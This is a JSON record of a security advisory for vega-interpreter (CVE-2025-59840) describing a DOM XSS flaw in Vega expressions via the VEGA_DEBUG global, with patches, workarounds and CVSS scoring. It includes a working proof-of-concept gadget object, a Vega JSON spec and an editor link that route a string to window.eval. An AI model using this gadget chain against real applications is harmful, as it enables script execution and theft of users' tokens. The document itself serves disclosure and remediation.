{
  "Severity": "HIGH",
  "UpdatedAt": "2025-11-13T22:32:36Z",
  "Package": {
    "Ecosystem": "NPM",
    "Name": "vega-interpreter"
  },
  "Advisory": {
    "DatabaseId": 321686,
    "Id": "GSA_kwCzR0hTQS03ZjJ2LTNxcTMtdnZqZs4ABOiW",
    "GhsaId": "GHSA-7f2v-3qq3-vvjf",
    "References": [
      {
        "Url": "https://github.com/vega/vega/security/advisories/GHSA-7f2v-3qq3-vvjf"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2025-59840"
      },
      {
        "Url": "https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239"
      },
      {
        "Url": "https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16"
      },
      {
        "Url": "https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA"
      },
      {
        "Url": "https://vega.github.io/vega/usage/interpreter"
      },
      {
        "Url": "https://github.com/advisories/GHSA-7f2v-3qq3-vvjf"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-7f2v-3qq3-vvjf"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2025-59840"
      }
    ],
    "Description": "## Impact\n\nApplications meeting 2 conditions are at risk of arbitrary JavaScript code execution, even if \"safe mode\" [expressionInterpreter](https://vega.github.io/vega/usage/interpreter/) is used. \n\n1. Use `vega` in an application that attaches `vega` library and a `vega.View` instance similar to the Vega [Editor](https://github.com/vega/editor) to the global `window`\n2. Allow user-defined Vega `JSON` definitions (vs JSON that was is only provided through source code)\n\n## Patches\n\n- If using latest Vega line (6.x)\n  - `vega` `6.2.0` / `vega-expression` `6.1.0` / `vega-interpreter`  `2.2.1` (if using AST evaluator mode)\n- If using Vega in a non-ESM environment\n  -  ( `vega-expression` `5.2.1` / `1.2.1` (if using AST evaluator mode)\n\n## Workarounds\n\n_Is there a way for users to fix or remediate the vulnerability without upgrading_\n\n- Do not attach `vega` View instances to global variables, as Vega editor used to do [here](https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/components/renderer/renderer.tsx#L239)\n- Do not attach `vega` to the global window as the editor used to do [here](https://github.com/vega/editor/blob/e102355589d23cdd0dbfd607a2cc5f9c5b7a4c55/src/index.tsx#L14-L16)\n\nThese practices of attaching the vega library and View instances may be convenient for debugging, but should _not_ be used in production or in any situation where vega/vega-lite definitions could be provided by untrusted parties.\n\n### POC Summary\n\nVega offers the evaluation of expressions in a secure context. Arbitrary function call is prohibited. When an event is exposed to an expression, member get of window objects is possible. Because of this exposure, in some applications, a crafted object that overrides its toString method with a function that results in calling `this.foo(this.bar)`, DOM XSS can be achieved. \n\nIn practice, an accessible gadget like this exists in the global VEGA_DEBUG code. \n\n```js\n({\n    toString: event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, \n    eventName: event.view.console.log,\n    _handlers: {\n        undefined: 'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'\n    },\n    _handlerIndex: event.view.eval\n})+1\n```\n\n### POC Details\n```json\n{\n  \"$schema\": \"https://vega.github.io/schema/vega/v5.json\",\n  \"width\": 350,\n  \"height\": 350,\n  \"autosize\": \"none\",\n  \"description\": \"Toggle Button\",\n  \"signals\": [\n    {\n      \"name\": \"toggle\",\n      \"value\": true,\n      \"on\": [\n        {\n          \"events\": {\"type\": \"click\", \"markname\": \"circle\"},\n          \"update\": \"toggle ? false : true\"\n        }\n      ]\n    },\n    {\n      \"name\": \"addFilter\",\n      \"on\": [\n        {\n          \"events\": {\"type\": \"mousemove\", \"source\": \"window\"},\n          \"update\": \"({toString:event.view.VEGA_DEBUG.vega.CanvasHandler.prototype.on, eventName:event.view.console.log,_handlers:{undefined:'alert(origin + ` XSS on version `+ VEGA_DEBUG.VEGA_VERSION)'},_handlerIndex:event.view.eval})+1\"\n        }\n\n      ]\n    }\n  ]\n}\n```\n\nThis payload creates a scenario where whenever the mouse is moved, the toString function of the provided object is implicitly called when trying to resolve adding it with 1. The toString function has been overridden to a \"gadget function\" (VEGA_DEBUG.vega.CanvasHandler.prototype.on) that does the following:\n\n```js\n   on(a, o) {\n        const u = this.eventName(a)\n          , d = this._handlers;\n        if (this._handlerIndex(d[u], a, o) \u003c 0) {\n        ....\n        }\n        ....\n   }\n```\n\n1. Set `u` to the result of calling `this.eventName` with undefined \n    - For our object, we have the eventName value set to console.log, which just logs undefined and returns undefined\n3. Sets `d` to `this._handlers`\n    - For our object, we have this defined to be used later\n4. Calls `this._handlerIndex` with the result of `u` indexed into the `d` object as the first argument, and undefined as the second two.\n    - For our object, `_handlerIndex` is set to window.eval, and when indexing undefined into the `_handlers`, a string to be evald containing the XSS payload is returned.\n    \nThis results in XSS by using a globally scoped gadget to get full blown eval. \n\n\n### PoC Link\n\nNavigate [to vega editor](https://vega.github.io/editor/#/url/vega/N4IgJAzgxgFgpgWwIYgFwhgF0wBwqgegIDc4BzJAOjIEtMYBXAI0poHsDp5kTykSArJQBWENgDsQAGhAB3GgBN6aAMwCADDPg0yWVRplIGmNhBoAvOGhDiJVmQrjQATjRyZ2k9ABU2ZMgA2cAAEAELGJpIyZmTiSAEQaADaoHEIVugm-kHSIMTxDBmYzoUyEsmgcKTimImooJgAnjgZIFABNFAA1rnIzl1prVA0zu1WAL4yDDgKSJitWYEhAPzBAGbxECGowcWFIOMAupOpSOnWSAoKAGI0AfPOueWoKSBVcDV1Dc2tCGwMWz+pFyYgYo1a8nECjYsgOUxmc1aAApgCYAMrFGjiMiod41SjEGhwWSUABqAFEAOIAQQA+gARcmhACqlIJfEoAGEkOJ8hAABI8hRBZyUHDONgmJotSgSKTBPGYAByZzguOqmAJRJJUAkYiClACfiktJgQpF+GADChcDWWLgClQAHJ4nBnJgkWxXLRxMEANTBAAGwQAGmi0cEJMFSM4zFHAwGKTSGUzWWSqXSKQAlNEASQA8kqAJROyam81u3M2gAe6o+msJxMoVXi4yLfoAjAdjscgA), move the mouse, and observe that the arbitrary JavaScript from the configuration reaches the eval sink and DOM XSS is achieved.\n\n### Future investigation\n\nIn cases where `VEGA_DEBUG` is not enabled, there theoreticallycould  be other gadgets on the global scope that allow for similar behavior. In cases where AST evaluator is used and there are blocks against getting references to `eval`, in theory there could be other gadgets on global scope (i.e. jQuery) that would allow for eval the same way (i.e. `$.globalEval`). As of this writing, no such globally scoped gadgets have been found. \n\n### Impact\n\nThis vulnerability allows for DOM XSS, potentially stored, potentially reflected, depending on how the library is being used. The vulnerability requires user interaction with the page to trigger.  \n\nAn attacker can exploit this issue by tricking a user into opening a malicious Vega specification. Successful exploitation allows the attacker to execute arbitrary JavaScript in the context of the applicationâ€™s domain. This can lead to theft of sensitive information such as authentication tokens, manipulation of data displayed to the user, or execution of unauthorized actions on behalf of the victim. This exploit compromises confidentiality and integrity of impacted applications.",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2025-11-13T22:32:35Z",
    "Severity": "HIGH",
    "Summary": "Vega Cross-Site Scripting (XSS) via expressions abusing toString calls in environments using the VEGA_DEBUG global variable",
    "UpdatedAt": "2025-11-14T16:05:42Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 8.1,
      "VectorString": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "1.2.1"
      },
      "VulnerableVersionRange": "\u003c 1.2.1"
    },
    {
      "FirstPatchedVersion": {
        "Identifier": "2.2.1"
      },
      "VulnerableVersionRange": "\u003e= 2.0.0, \u003c 2.2.1"
    }
  ]
}